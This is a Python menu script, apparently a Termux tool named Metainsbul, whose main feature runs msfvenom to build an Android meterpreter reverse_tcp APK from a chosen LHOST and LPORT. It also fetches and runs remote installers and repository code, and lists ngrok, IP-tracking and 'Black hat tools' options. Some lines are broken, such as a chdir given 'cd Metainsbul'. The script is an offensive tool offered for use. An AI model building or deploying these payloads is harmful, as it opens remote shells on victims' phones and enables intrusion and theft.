import os
    
def build_payload():
    lhost = input("LHOST - ")
    lport = input("LPORT - ")
    apk_name = input("Payload Name - ")
    print("THE PAYLOAD IS AUTOMATICALLY MOVED TO YOUR Sdcard")
    print("JUST OPEN FILE MANAGER AND VISIT APKS OR JUST SCROLL DOWN")
    print("IN FOLDERS SECTION")

    msfvenom_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {apk_name}.apk"

    print(msfvenom_command)

    os.system(msfvenom_command)

    os.system(f"mv {apk_name}.apk /storage/emulated/0/")

def update():
    os.system("rm -rf Metainsbul")
    os.system("git clone https://github.com/KiNGEX1/Metainsbul.git")
    os.chdir("cd Metainsbul")
    os.system("chmod +x Meta.py")
    os.system("python Meta.py")

def install_metasploit():
    os.system("python requirements.py")

def launch_metasploit():
    os.system('pkg install curl')
    os.system('pkg install ruby -y')
    os.system('curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \')
    os.system('chmod 755 msfinstall && \')
    os.system('./msfinstall')

  
while True:
    os.system("clear")
    print("███╗░░░███╗███████╗████████╗░█████╗░██╗███╗░░██╗░██████╗██████╗░██╗░░░██╗██╗░░░░░")
    print("████╗░████║██╔════╝╚══██╔══╝██╔══██╗██║████╗░██║██╔════╝██╔══██╗██║░░░██║██║░░░░░")
    print("██╔████╔██║█████╗░░░░░██║░░░███████║██║██╔██╗██║╚█████╗░██████╦╝██║░░░██║██║░░░░░")
    print("██║╚██╔╝██║██╔══╝░░░░░██║░░░██╔══██║██║██║╚████║░╚═══██╗██╔══██╗██║░░░██║██║░░░░░")
    print("██║░╚═╝░██║███████╗░░░██║░░░██║░░██║██║██║░╚███║██████╔╝██████╦╝╚██████╔╝███████╗")
    print("╚═╝░░░░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░░╚═════╝░╚══════╝")
    print(" By KiNGEX | https://GitHub.com/KiNGEX1")
    print("________________________________________")


    print("Options:")
    print("1. Build Payload (Android Only) ")
    print("2. Install Metasploit (from modified scprit)")
    print("3. Install Metasploit (from official)")
    print("4. Update Metainsbul") 
    print("5. Ngrok Install & Start")
    print("6. IP Tracker")
    print("7. Fix Errors")
    print("8. Install ubuntu to run as root")
    print("9. Install Metasploit in ubuntu")
    print("10. Launch Metasploit in unbuntu (You can run msfvemon commands) ")
    print("11. Launch Metasploit")
    print("12. Black hat tools")
    print("13. exit tool")

    choice = input("\033[91mKiNGEX: \033[0m").strip()

    if choice == '1':
        build_payload() 
    elif choice == '2':
        install_metasploit()
    elif choice == '3':
        launch_metasploit()
    elif choice == '4':
        update()
    elif choice == '6':
        os.system("clear")
        os.system("python iptrack.py")   
    elif choice == '5':
        os.system("python Ngrokinstall.py")
    elif choice == '7':
        os.system("python ErrorFix.py")
    elif choice == '8':
        os.system('python process.py')
        
